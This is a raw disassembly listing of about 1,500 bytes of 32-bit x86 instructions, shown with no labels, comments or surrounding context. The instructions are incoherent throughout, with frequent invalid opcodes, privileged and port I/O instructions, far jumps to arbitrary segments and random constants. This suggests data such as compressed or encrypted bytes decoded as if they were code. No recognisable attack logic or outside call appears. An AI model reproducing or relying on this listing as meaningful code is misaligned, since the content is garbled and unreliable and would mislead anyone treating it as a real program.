  416a0e:	add    eax,0x3cf9a737
  416a13:	mov    esp,0x3b3be3a3
  416a18:	pop    edi
  416a19:	or     al,0x82
  416a1b:	pop    edx
  416a1c:	add    al,0x27
  416a1f:	xor    DWORD PTR [esi],esi
  416a21:	jne    0x4169bc
  416a23:	or     edx,DWORD PTR [esi]
  416a25:	es jmp 0x416aa5
  416a28:	inc    edi
  416a29:	repz jmp 0x8aea9773
  416a2f:	les    edx,FWORD PTR [edx+ecx*4+0xb]
  416a33:	mov    bl,0x3
  416a35:	mov    ah,0xe5
  416a37:	clc    
  416a38:	hlt    
  416a39:	ret    
  416a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a3b:	pop    esi
  416a3c:	xchg   edi,eax
  416a3d:	sbb    DWORD PTR [esi+0x13fa04],edx
	...
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx-0x25f4e5ae]
  416ac3:	(bad)  
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    BYTE PTR [edi],dl
  416acd:	xchg   ebp,eax
  416ace:	ins    BYTE PTR es:[edi],dx
  416acf:	mov    bl,0xa1
  416ad1:	(bad)  
  416ad2:	pop    edi
  416ad3:	mul    ah
  416ad5:	sub    DWORD PTR [eax-0x2677e8df],0xa6d99e22
  416adf:	cmp    al,0xd2
  416ae1:	dec    ebp
  416ae2:	xor    BYTE PTR [ebx-0x67d26ca],dh
  416ae8:	(bad)  
  416ae9:	mov    dl,BYTE PTR [esi+ebp*1]
  416aec:	js     0x416b33
  416aee:	fcmovnu st,st(3)
  416af0:	cmp    DWORD PTR [ebx-0x24da22b0],0xffffffa6
  416af7:	retf   
  416af8:	sbb    BYTE PTR [ecx+ebp*8-0x25e6cde8],dl
  416aff:	ja     0x416a9a
  416b01:	or     edi,DWORD PTR [edx-0x1e]
  416b04:	inc    edi
  416b05:	mov    ds:0x1a2f5eac,al
  416b0a:	int    0xd2
  416b0c:	push   ds
  416b0d:	popa   
  416b0e:	sbb    eax,0x7b8d8a84
  416b13:	jbe    0x416b2b
  416b15:	ins    BYTE PTR es:[edi],dx
  416b16:	pushf  
  416b17:	mov    ch,0x92
  416b19:	or     esp,DWORD PTR ds:0x51f153f3
  416b1f:	pop    edi
  416b20:	imul   esi,edx,0xffffffd9
  416b23:	test   al,0xa0
  416b25:	dec    ebx
  416b26:	enter  0xb9c9,0x9a
  416b2a:	xchg   BYTE PTR [edx+eiz*4-0x4030a0e1],cl
  416b31:	push   ds
  416b32:	lods   al,BYTE PTR ds:[esi]
  416b33:	test   DWORD PTR [eax-0x7b],esi
  416b36:	fisubr DWORD PTR [edi-0x2c]
  416b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b3a:	sbb    eax,edi
  416b3c:	pushf  
  416b3d:	outs   dx,BYTE PTR ds:[esi]
  416b3e:	add    edi,esp
  416b40:	jl     0x416bba
  416b42:	adc    DWORD PTR [ebx-0x34],eax
  416b45:	jne    0x416b61
  416b47:	jge    0x416b60
  416b49:	jge    0x416acc
  416b4b:	and    eax,0xb4723943
  416b50:	inc    eax
  416b51:	mov    al,0x73
  416b53:	aaa    
  416b54:	mov    esi,0x9a9c5298
  416b59:	mov    al,ds:0x4d8d498
  416b5e:	xchg   BYTE PTR [ecx],bh
  416b60:	test   eax,0x63bc54f2
  416b65:	sub    eax,0x4642b2cf
  416b6a:	stos   BYTE PTR es:[edi],al
  416b6b:	popf   
  416b6c:	inc    edi
  416b6d:	dec    eax
  416b6e:	sub    eax,0x19700293
  416b73:	inc    ebx
  416b74:	call   0xf999ea7f
  416b79:	outs   dx,DWORD PTR ds:[esi]
  416b7a:	test   eax,0x9bdcb7af
  416b7f:	bound  ecx,QWORD PTR [eax-0x12]
  416b82:	pop    ebp
  416b83:	popf   
  416b84:	mov    ebp,0x6efc3979
  416b89:	je     0x416b77
  416b8b:	xor    eax,0xe7e0d5e9
  416b90:	mov    dl,BYTE PTR [esi+0x31]
  416b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b94:	mov    dh,0x81
  416b96:	(bad)  
  416b97:	and    eax,DWORD PTR [edx+0x470f3150]
  416b9d:	dec    esp
  416b9e:	sbb    eax,0xcc9ebf2e
  416ba3:	retf   
  416ba4:	mov    ebp,0xc234f056
  416ba9:	jb     0x416b52
  416bab:	test   al,0x95
  416bad:	rol    DWORD PTR [esi],0xc8
  416bb0:	xchg   ecx,eax
  416bb1:	hlt    
  416bb2:	inc    edi
  416bb3:	test   BYTE PTR [esi],0x23
  416bb6:	pop    es
  416bb7:	pop    eax
  416bb8:	fnstsw WORD PTR [esi+ebx*1+0x1bf9b78f]
  416bbf:	mov    cl,cl
  416bc1:	and    al,0x0
	...
  416c33:	add    BYTE PTR [edx],bh
  416c35:	adc    BYTE PTR [edi-0x444040c4],bh
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    ecx,DWORD PTR [edi-0x3b7ff7cf]
  416c45:	clc    
  416c46:	add    BYTE PTR [eax],al
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    BYTE PTR [esp+edx*2-0x122f8c0b],dl
  416c52:	xor    al,0x47
  416c54:	ret    0x5fd2
  416c57:	xchg   DWORD PTR [esi],edx
  416c59:	cmp    bh,BYTE PTR [eax-0x26]
  416c5c:	test   DWORD PTR [eax+0x42],edi
  416c5f:	fwait
  416c60:	mov    ds:0x653ca435,eax
  416c65:	mov    edx,0x356076c3
  416c6a:	jnp    0x416c06
  416c6c:	dec    esi
  416c6d:	stc    
  416c6e:	call   FWORD PTR [edx]
  416c70:	pop    ebx
  416c71:	push   esi
  416c72:	(bad)  
  416c74:	xchg   ebx,eax
  416c75:	loopne 0x416c6c
  416c77:	and    BYTE PTR [edx+0xb4126fa],bl
  416c7d:	dec    ebx
  416c7e:	and    al,0xd7
  416c80:	ins    DWORD PTR es:[edi],dx
  416c81:	scas   al,BYTE PTR es:[di]
  416c83:	adc    eax,0x35adf75a
  416c88:	test   al,0x92
  416c8a:	js     0x416c7f
  416c8c:	push   ebx
  416c8d:	ret    
  416c8e:	dec    ecx
  416c8f:	daa    
  416c90:	and    DWORD PTR [ecx+edx*2],edx
  416c93:	aaa    
  416c94:	js     0x416d13
  416c96:	ja     0x416d09
  416c98:	lea    esp,ds:0xb4705c75
  416c9e:	cmc    
  416c9f:	clc    
  416ca0:	sbb    dh,BYTE PTR [ebp-0x67]
  416ca3:	dec    ebp
  416ca4:	aam    0xff
  416ca6:	dec    ebp
  416ca7:	test   eax,0xa66dbe9
  416cac:	rcr    BYTE PTR [ecx-0x1ac6a23f],1
  416cb2:	ret    
  416cb3:	fs jge 0x416ced
  416cb6:	xor    eax,0x3d062c1a
  416cbb:	xchg   ebx,eax
  416cbc:	popa   
  416cbd:	gs rcl DWORD PTR gs:[ebp+0x7aa67693],cl
  416cc5:	cdq    
  416cc6:	(bad)  
  416cc7:	adc    al,dh
  416cc9:	je     0x416d1f
  416ccb:	push   ebx
  416ccc:	jp     0x416d12
  416cce:	fadd   DWORD PTR [ecx-0x3fa72ee6]
  416cd4:	mov    esi,0xbfb846c5
  416cd9:	sub    dh,0xce
  416cdc:	or     al,0x8d
  416cde:	icebp  
  416cdf:	pop    ebx
  416ce0:	lods   eax,DWORD PTR ds:[esi]
  416ce1:	ja     0x416d29
  416ce3:	(bad)  
  416ce4:	pop    edx
  416ce5:	push   esp
  416ce6:	xchg   edi,eax
  416ce7:	and    DWORD PTR [ebp+0x5c],ecx
  416cea:	push   esi
  416ceb:	sub    DWORD PTR [ebp+0x59],esi
  416cee:	mov    dh,BYTE PTR [ebp-0x3d85f9f4]
  416cf4:	dec    esi
  416cf5:	cmc    
  416cf6:	cmp    ah,BYTE PTR [ebp-0x7b]
  416cf9:	in     eax,0x6a
  416cfb:	repnz dec ebx
  416cfd:	and    ebp,DWORD PTR [eax-0x7769e3c6]
  416d03:	cmp    DWORD PTR [ebp-0x2104399],esp
  416d09:	mov    esi,0xecbaca12
  416d0e:	das    
  416d0f:	dec    esp
  416d10:	xchg   edx,eax
  416d11:	mov    edi,edx
  416d13:	mov    ebx,0xe37fa0fb
  416d18:	cld    
  416d19:	cld    
  416d1a:	dec    eax
  416d1b:	sbb    DWORD PTR [eax+0x16],ebx
  416d1e:	or     ebp,DWORD PTR [eax+0xe06ffc9]
  416d24:	into   
  416d25:	cmp    eax,0x5127bad4
  416d2a:	or     al,0xdb
  416d2c:	jmp    0x416d87
  416d2e:	pop    edi
  416d2f:	and    al,ch
  416d31:	retf   
  416d32:	call   0xce017b7a
  416d37:	(bad)  
  416d38:	and    DWORD PTR [edx+0x2a],esi
  416d3b:	xchg   ebx,eax
  416d3c:	addr16 jmp 0x0:0x8f41b21a
	...
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x7d0e0089
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [edi],dh
  416dcd:	xlat   BYTE PTR ds:[ebx]
  416dce:	xchg   esp,eax
  416dcf:	xor    dh,BYTE PTR [edx+ebp*2]
  416dd2:	js     0x416e00
  416dd4:	ror    BYTE PTR [edi+0x16],1
  416dd7:	fwait
  416dd8:	jge    0x416e1f
  416dda:	jae    0x416de8
  416ddc:	sbb    bl,BYTE PTR [ebx-0x62]
  416ddf:	jnp    0x416dd2
  416de1:	retf   
  416de2:	hlt    
  416de3:	or     esp,DWORD PTR [ecx-0x647fe5f5]
  416de9:	in     al,0x47
  416deb:	xchg   BYTE PTR [ecx-0x13],bl
  416dee:	in     eax,dx
  416def:	aaa    
  416df0:	xor    eax,0xc15a502b
  416df5:	jo     0x416db7
  416df7:	jmp    0xa4d6:0x23dcd2d7
  416dfe:	ins    DWORD PTR es:[edi],dx
  416dff:	lea    esi,[ebx-0x10]
  416e02:	in     eax,0xb
  416e04:	aas    
  416e05:	clc    
  416e06:	jge    0x416dd3
  416e08:	stos   BYTE PTR es:[edi],al
  416e09:	lock mov ah,BYTE PTR [edx-0x4]
  416e0d:	imul   edx,DWORD PTR [edx+0x2b37d124],0xffffffe6
  416e14:	pop    esi
  416e15:	pop    ecx
  416e16:	test   eax,0xa4ef7cf5
  416e1b:	inc    eax
  416e1c:	(bad)  
  416e1d:	stc    
  416e1e:	jle    0x416e1a
  416e20:	jmp    0x4539:0x681ff029
  416e27:	mov    ah,0xbe
  416e29:	mov    edx,0xd27e3e75
  416e2e:	out    0xc5,eax
  416e30:	sub    BYTE PTR [eax+0x3a],ah
  416e33:	lods   eax,DWORD PTR ds:[esi]
  416e34:	xor    BYTE PTR [ecx],al
  416e36:	stos   BYTE PTR es:[edi],al
  416e37:	outs   dx,BYTE PTR ds:[esi]
  416e38:	adc    dl,BYTE PTR [ebx+0x1c9528d7]
  416e3e:	adc    DWORD PTR [eax+0x66],eax
  416e41:	jecxz  0x416e71
  416e43:	inc    ebp
  416e44:	adc    BYTE PTR [eax],bl
  416e46:	sub    ah,BYTE PTR [ecx-0xa9d9bca]
  416e4c:	cs loop 0x416ea5
  416e4f:	xor    bh,BYTE PTR [edx+edx*8+0xd8c0e84]
  416e56:	xor    cl,BYTE PTR [edx-0x18]
  416e59:	sbb    edi,edx
  416e5b:	mov    esp,esp
  416e5d:	inc    ecx
  416e5e:	loop   0x416e8d
  416e60:	mov    ch,0xe7
  416e62:	cdq    
  416e63:	push   ebx
  416e64:	loopne 0x416e05
  416e66:	mov    ds:0x214b36be,al
  416e6b:	xlat   BYTE PTR ds:[ebx]
  416e6c:	enter  0xa547,0x93
  416e70:	into   
  416e71:	call   0x26da1ceb
  416e76:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e78:	stc    
  416e79:	and    esi,DWORD PTR [esi+0x53abda69]
  416e7f:	in     al,dx
  416e80:	js     0x416e8b
  416e82:	hlt    
  416e83:	xchg   ecx,eax
  416e84:	outs   dx,DWORD PTR ds:[esi]
  416e85:	sbb    dl,bh
  416e87:	out    dx,al
  416e88:	pop    es
  416e89:	mov    cl,0xcf
  416e8b:	and    al,0x60
  416e8d:	loope  0x416e82
  416e8f:	test   DWORD PTR [edx-0x56],0xcc229489
  416e96:	pop    edx
  416e97:	aam    0xbf
  416e99:	xor    eax,DWORD PTR ds:0x477958c7
  416e9f:	ds lahf 
  416ea1:	mov    bh,0xe7
  416ea3:	jo     0x416e46
  416ea5:	int    0xb
  416ea7:	dec    ecx
  416ea8:	mov    ss,WORD PTR [ebx-0x45136821]
  416eae:	and    al,dl
  416eb0:	add    ah,bl
  416eb2:	aaa    
  416eb3:	xor    DWORD PTR [edx+0x4bc9b6a3],ebp
  416eb9:	xchg   esi,eax
  416eba:	(bad)  
  416ebc:	mov    esi,0x94fcbe0b
  416ec1:	jae    0x416ec3
	...
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	push   esi
  416f41:	pop    ebx
  416f42:	clc    
  416f43:	cmpxchg dl,bh
  416f46:	add    BYTE PTR [eax],al
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    bl,dh
  416f4d:	pushf  
  416f4e:	xchg   edi,eax
  416f4f:	push   esi
  416f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f51:	sahf   
  416f52:	xor    ebx,esp
  416f54:	clc    
  416f55:	and    eax,0x325f7288
  416f5a:	mov    dh,0xb0
  416f5c:	fsubp  st(2),st
  416f5e:	sub    eax,0x19062138
  416f63:	dec    esp
  416f64:	inc    eax
  416f65:	fcom   QWORD PTR [edi+0x3a]
  416f68:	in     al,dx
  416f69:	xlat   BYTE PTR ds:[ebx]
  416f6a:	jge    0x416fd6
  416f6c:	lods   al,BYTE PTR ds:[esi]
  416f6d:	mov    dl,0xb4
  416f6f:	mov    ah,0x9
  416f71:	jecxz  0x416f51
  416f73:	mov    ah,0x65
  416f75:	aad    0xc5
  416f77:	push   0x7d
  416f79:	push   0x32b22bcc
  416f7e:	dec    esi
  416f7f:	push   edx
  416f80:	inc    esi
  416f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f82:	sbb    ebx,DWORD PTR [ecx]
  416f84:	lds    ecx,FWORD PTR [eax-0x1e9034c5]
  416f8a:	xor    eax,0x18a71ad8
  416f8f:	pop    esi
  416f90:	in     al,0x9
  416f92:	out    0xac,eax
  416f94:	out    0x65,al
  416f96:	loop   0x416fcd
  416f98:	add    eax,0xa6ee5b1d
  416f9d:	mov    ebx,0x50c2f439
  416fa2:	cmp    al,bl
  416fa4:	and    eax,0x6c80bb92
  416fa9:	xor    cl,al
  416fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fac:	es jg  0x416f5e
  416faf:	and    bl,BYTE PTR [edx+0x8]
  416fb2:	sbb    ebp,DWORD PTR [ecx]
  416fb4:	sar    DWORD PTR [edi+0x28],0xef
  416fb8:	js     0x416fa2
  416fba:	ret    0xaab8
  416fbd:	sub    esi,DWORD PTR [ebx]
  416fbf:	jl     0x416fd5
  416fc1:	xchg   DWORD PTR [esi-0x534199f9],ebp
  416fc7:	gs pop ds
  416fc9:	pop    edi
  416fca:	pop    edi
  416fcb:	ins    DWORD PTR es:[edi],dx
  416fcc:	pop    ebx
  416fcd:	in     al,0xc6
  416fcf:	xchg   esi,eax
  416fd0:	jecxz  0x41702b
  416fd2:	adc    ebp,DWORD PTR [edx+0x0]
  416fd5:	test   eax,0x2a9e06c1
  416fda:	xchg   BYTE PTR [ecx-0x5929a0a9],bh
  416fe0:	bnd jnp 0x417004
  416fe3:	jmp    0x416fa9
  416fe5:	mov    ebp,DWORD PTR [ebx+eax*8+0x64]
  416fe9:	xor    ebx,DWORD PTR [ebx-0x11]
  416fec:	inc    eax
  416fed:	push   eax
  416fee:	retf   0xf890
  416ff1:	adc    esp,DWORD PTR [esi-0x21d705d8]
  416ff7:	dec    ebx
  416ff8:	xor    al,0xd
  416ffa:	mov    ch,0x5b
  416ffc:	fwait
  416ffd:	mov    edi,0xc5129ca9
  417002:	jbe    0x417053
  417004:	test   BYTE PTR [eax+eax*2-0x7a],dl
  417008:	push   ebp
  417009:	xchg   esi,eax
  41700a:	xchg   edi,eax
  41700b:	rol    BYTE PTR [esi-0x545aa963],0xf4
  417012:	jg     0x416f9e
  417014:	jl     0x41702e
  417016:	scas   al,BYTE PTR es:[edi]
  417017:	aaa    
  417018:	cld    
  417019:	fs (bad) 
  41701b:	jle    0x416fea
  41701d:	add    cl,BYTE PTR [ebp-0x6813409c]
  417023:	cmp    al,BYTE PTR [esi-0x1003a905]
  417029:	adc    cl,BYTE PTR [edi-0x5cec8db0]
  41702f:	or     al,0xc7
  417031:	es push es
  417033:	loop   0x416fdb
  417035:	fdivr  DWORD PTR [eax-0xe]
  417038:	popf   
  417039:	dec    ebp
  41703a:	dec    ebx
  41703b:	push   0xac470601
  417040:	ins    DWORD PTR es:[edi],dx
  417041:	mov    esi,0x0
	...
  4170b2:	add    BYTE PTR [eax],al
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	add    DWORD PTR [edx],0x16
  4170c2:	sbb    al,0xdf
  4170c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	test   BYTE PTR [eax],0x0
  4170cb:	add    dh,cl
  4170cd:	outs   dx,BYTE PTR ds:[esi]
  4170ce:	or     BYTE PTR [edx+0x55f969cf],ah
  4170d4:	inc    esi
  4170d5:	loope  0x417094
  4170d7:	add    al,BYTE PTR [ebp-0x7a]
  4170da:	xor    bh,BYTE PTR [ecx-0x1c2f1007]
  4170e0:	outs   dx,BYTE PTR ds:[esi]
  4170e1:	pop    ebp
  4170e2:	adc    BYTE PTR [esi+ecx*8+0x21b013a9],ah
  4170e9:	pop    edi
  4170ea:	mov    ecx,0xc0496125
  4170ef:	test   eax,0xcdc9a21a
  4170f4:	or     BYTE PTR [edi-0x54],0x1f
  4170f8:	nop
  4170f9:	idiv   BYTE PTR [ebx]
  4170fb:	aam    0x28
  4170fd:	or     DWORD PTR ds:0x638a6b75,0xe7e77401
  417107:	call   0x166:0x6272c90b
  41710e:	shl    ebx,cl
  417110:	adc    eax,0x1ae3821a
  417115:	arpl   bp,sp
  417117:	xchg   ebp,eax
  417118:	ja     0x417134
  41711a:	push   cs
  41711b:	jle    0x417198
  41711d:	cdq    
  41711e:	pop    ds
  41711f:	icebp  
  417120:	out    0xa2,eax
  417122:	mov    eax,fs
  417124:	xor    esp,DWORD PTR [ecx-0x16]
  417127:	cs xor al,0x9d
  41712a:	mov    ch,0x2b
  41712c:	(bad)  
  41712d:	jne    0x417163
  41712f:	popa   
  417130:	out    0xb3,eax
  417132:	mov    esi,0x3aeedbb4
  417137:	fld    TBYTE PTR [edi-0x6e8fef19]
  41713d:	mov    eax,DWORD PTR [ecx]
  41713f:	repz jne 0x417195
  417142:	pusha  
  417143:	xchg   ecx,eax
  417144:	imul   ebp,ebx,0x53117eb7
  41714a:	mov    edx,0x836ab41c
  41714f:	pop    edi
  417150:	jge    0x417199
  417152:	sub    DWORD PTR [edx],0xffffffa7
  417155:	mov    ebp,DWORD PTR [eax-0x668deb5a]
  41715b:	sub    BYTE PTR [ebx+0x7528ed4a],ch
  417161:	mov    dh,BYTE PTR ds:0xf5b27a2e
  417167:	call   FWORD PTR [eax]
  417169:	mov    edx,0x78543ccf
  41716e:	dec    esp
  41716f:	push   ebp
  417170:	mov    ebx,?
  417172:	rcr    BYTE PTR [ecx],0xe4
  417175:	xchg   ecx,eax
  417176:	or     eax,0x259f1eb7
  41717b:	int    0x75
  41717d:	je     0x417108
  41717f:	mov    DWORD PTR [edi],edx
  417181:	jno    0x41716c
  417183:	pop    esi
  417184:	jle    0x417189
  417186:	repz xchg esi,eax
  417188:	fbstp  TBYTE PTR [esi-0xa955a94]
  41718e:	jo     0x41713a
  417190:	xor    ebp,esi
  417192:	inc    eax
  417193:	call   0xe8adb26
  417198:	test   eax,0x31a13e3b
  41719d:	clc    
  41719e:	sbb    DWORD PTR ds:0x8d621c98,eax
  4171a4:	sbb    al,0xc0
  4171a6:	fsub   DWORD PTR [ecx-0x16c07c3a]
  4171ac:	push   ecx
  4171ad:	shr    BYTE PTR [eax-0x20],0xc5
  4171b1:	lods   eax,DWORD PTR ds:[esi]
  4171b2:	or     BYTE PTR ds:0xecda0462,cl
  4171b8:	cmp    eax,DWORD PTR [edi-0x6f]
  4171bb:	ss repnz inc eax
  4171be:	push   0x5e
  4171c0:	fild   DWORD PTR [edi+0x0]
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	and    dx,WORD PTR [ebx-0x3638ea6]
  417246:	add    BYTE PTR [eax],al
  417248:	test   BYTE PTR [eax],0x0
  41724b:	add    cl,dh
  41724d:	imul   ecx,DWORD PTR [edx+0x22],0xa83a9f45
  417254:	mov    dl,0xf9
  417256:	adc    ebp,edx
  417258:	icebp  
  417259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41725a:	arpl   di,dx
  41725c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41725d:	pop    eax
  41725e:	sub    BYTE PTR [ecx+0x12],0xdb
  417262:	push   cs
  417263:	out    dx,eax
  417264:	xchg   sp,ax
  417266:	cmp    al,0x5a
  417268:	dec    ecx
  417269:	cli    
  41726a:	xchg   edi,eax
  41726b:	mov    bh,0xdd
  41726d:	mov    ds:0x8147941e,al
  417272:	test   BYTE PTR [edx-0x23],0x8d
  417276:	add    eax,0xc40328de
  41727b:	aad    0x8c
  41727d:	(bad)
  417280:	pop    es
  417281:	jno    0x417261
  417283:	cmp    esp,ecx
  417285:	cmp    al,0xe8
  417287:	aad    0x64
  417289:	or     DWORD PTR [ebx],edx
  41728b:	cwde   
  41728c:	jne    0x41721b
  41728e:	cmp    DWORD PTR [esi-0x18],eax
  417291:	aam    0xf5
  417293:	mov    DWORD PTR [edi-0x442e1f15],ebp
  417299:	clc    
  41729a:	(bad)  
  41729b:	and    DWORD PTR [ebx-0x2d],edx
  41729e:	or     al,0x39
  4172a0:	and    DWORD PTR [ebx+0x55cc6170],0x16
  4172a7:	jge    0x417256
  4172a9:	xor    eax,0x3e64b6cf
  4172ae:	outs   dx,DWORD PTR ds:[esi]
  4172af:	(bad)  
  4172b0:	call   0x54feb92e
  4172b5:	inc    ecx
  4172b6:	pushf  
  4172b7:	xchg   ebp,eax
  4172b8:	and    al,0xb
  4172ba:	add    al,0xd6
  4172bd:	das    
  4172be:	scas   al,BYTE PTR es:[edi]
  4172bf:	js     0x417312
  4172c1:	pop    ss
  4172c2:	shr    cl,cl
  4172c4:	inc    eax
  4172c5:	add    DWORD PTR [ebx-0x3b],edi
  4172c8:	pop    edx
  4172c9:	mov    eax,esp
  4172cb:	ins    BYTE PTR es:[edi],dx
  4172cc:	shl    BYTE PTR [edx-0x31],cl
  4172cf:	cmp    DWORD PTR [ecx-0x3],edx
  4172d2:	inc    edi
  4172d3:	cwde   
  4172d4:	aas    
  4172d5:	arpl   WORD PTR [ecx+ebx*1],di
  4172d8:	jae    0x417321
  4172da:	jns    0x417344
  4172dc:	xor    BYTE PTR [eax],dh
  4172de:	fldcw  WORD PTR [eax]
  4172e0:	frstor [eax-0x34]
  4172e3:	stos   DWORD PTR es:[edi],eax
  4172e4:	imul   DWORD PTR [eax+0x598a4182]
  4172ea:	jge    0x417291
  4172ec:	push   ds
  4172ed:	xchg   esi,eax
  4172ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ef:	and    esp,DWORD PTR [eax+ecx*4]
  4172f2:	ss pushf 
  4172f4:	inc    esp
  4172f5:	xlat   BYTE PTR ds:[ebx]
  4172f6:	push   ss
  4172f7:	ret    0xa4bb
  4172fa:	sbb    cl,BYTE PTR [ecx-0x2c]
  4172fd:	inc    esi
  4172fe:	dec    ebp
  4172ff:	arpl   WORD PTR [esi-0x24d25378],ax
  417305:	add    al,0x22
  417307:	hlt    
  417308:	repz mov ss,WORD PTR [ecx]
  41730b:	leave  
  41730c:	and    DWORD PTR [edi],esp
  41730e:	imul   ebp,DWORD PTR ds:0xda546c04,0x7832c554
  417318:	and    esi,DWORD PTR [ebx+0x7a]
  41731b:	mov    ch,BYTE PTR [ebx+eiz*1+0x6abbd96a]
  417322:	in     eax,0x9e
  417324:	fst    DWORD PTR [esi+0x8cd07ea]
  41732a:	or     esp,DWORD PTR [edi-0x3dc0e56a]
  417330:	xlat   BYTE PTR ds:[ebx]
  417331:	jmp    0x1563:0x2bbec6cd
  417338:	(bad)
  41733c:	sbb    esi,DWORD PTR [ebx+0x33f60de7]
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0xb4
  4173c1:	data16 mov ah,0xe0
  4173c4:	xchg   edx,eax
  4173c5:	std    
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	test   BYTE PTR [eax],0x0
  4173cb:	add    BYTE PTR ds:0x726ae44b,al
  4173d1:	cmp    edi,DWORD PTR [ebp-0x6c]
  4173d4:	test   BYTE PTR [edx],ch
  4173d6:	adc    ebx,DWORD PTR [esi]
  4173d8:	or     BYTE PTR [esi+0x2fdf22f9],0xe5
  4173df:	(bad)  
  4173e0:	cld    
  4173e1:	repz dec ebp
  4173e3:	mov    esi,0xaa4c3d9a
  4173e8:	push   cs
  4173e9:	bound  eax,QWORD PTR [ebp+0x45]
  4173ec:	and    BYTE PTR [edi+0x5d],bl
  4173ef:	mov    ah,0xb1
  4173f1:	addr16 pop eax
  4173f3:	enter  0xd60c,0x1d
  4173f7:	jmp    0x2ef7fd8a
  4173fc:	clc    
  4173fd:	outs   dx,BYTE PTR ds:[esi]
  4173fe:	inc    ebp
  4173ff:	data16 int3 
  417401:	inc    ebx
  417402:	jns    0x417443
  417404:	cs jle 0x41742f
  417407:	push   ebp
  417408:	test   BYTE PTR [esi],bh
  41740a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41740b:	pusha  
  41740c:	mov    ebp,0x5a900849
  417411:	je     0x4173ff
  417413:	xchg   edx,eax
  417414:	mov    eax,ds:0x1c292eeb
  417419:	inc    edi
  41741a:	lds    esp,FWORD PTR [ecx+0x5b7341c1]
  417420:	add    al,0x58
  417422:	push   cs
  417423:	loope  0x41740b
  417425:	in     eax,dx
  417426:	loope  0x417470
  417428:	pop    ebx
  417429:	idiv   DWORD PTR [eax]
  41742b:	jg     0x417446
  41742d:	and    ecx,ebp
  41742f:	push   esp
  417430:	mov    edi,?
  417432:	mov    esi,0x4e1eff5
  417437:	repnz pop ds
  417439:	sub    cl,BYTE PTR [esi+0x50651b37]
  41743f:	xlat   BYTE PTR ds:[ebx]
  417440:	xor    esi,DWORD PTR [ebx+0x3fc7bbbb]
  417446:	jg     0x41745d
  417448:	div    DWORD PTR [edx-0x65e5b42b]
  41744e:	lods   eax,DWORD PTR ds:[esi]
  41744f:	(bad)  
  417450:	jno    0x4174ab
  417452:	aaa    
  417453:	bound  eax,QWORD PTR [eax+eax*8-0x39544db6]
  41745a:	cld    
  41745b:	ficomp WORD PTR [edi+0x4c0bc0c5]
  417461:	inc    eax
  417462:	ret    0x812a
  417465:	add    al,0x7
  417467:	jecxz  0x4174cb
  417469:	jo     0x41744e
  41746b:	jp     0x41748e
  41746d:	inc    edx
  41746e:	out    0xd8,eax
  417470:	xchg   ah,ch
  417472:	jno    0x417454
  417474:	lods   al,BYTE PTR ds:[esi]
  417475:	jb     0x417490
  417477:	call   0x9d050abf
  41747c:	les    esi,FWORD PTR [edx+0x29]
  41747f:	mov    eax,fs
  417481:	fisub  DWORD PTR [eax]
  417483:	les    eax,FWORD PTR [ecx-0xa7d6a3e]
  417489:	pop    edx
  41748a:	lods   eax,DWORD PTR ds:[esi]
  41748b:	test   BYTE PTR [ebx],bh
  41748d:	add    ah,BYTE PTR ds:0x5a1d6801
  417493:	push   es
  417494:	ins    DWORD PTR es:[edi],dx
  417495:	mov    cs,WORD PTR [ebx-0x399ece08]
  41749b:	jle    0x417451
  41749d:	push   ss
  41749e:	frstor [ecx-0x112a8bd]
  4174a4:	adc    cl,BYTE PTR [edi]
  4174a6:	cmp    esi,esp
  4174a8:	cdq    
  4174a9:	pxor   mm4,QWORD PTR [ebx-0x76]
  4174ad:	and    ebx,DWORD PTR [esi-0x47ec1e]
  4174b3:	call   0xb16f2b57
  4174b8:	lds    esi,FWORD PTR [ecx-0x6a]
  4174bb:	mov    dl,0x51
  4174bd:	mov    eax,0x7e5230aa
	...
  417532:	add    BYTE PTR [eax],al
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x9ec93b7a
  417542:	cld    
  417543:	test   DWORD PTR [eax-0x9ffff02],ecx
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [eax],al
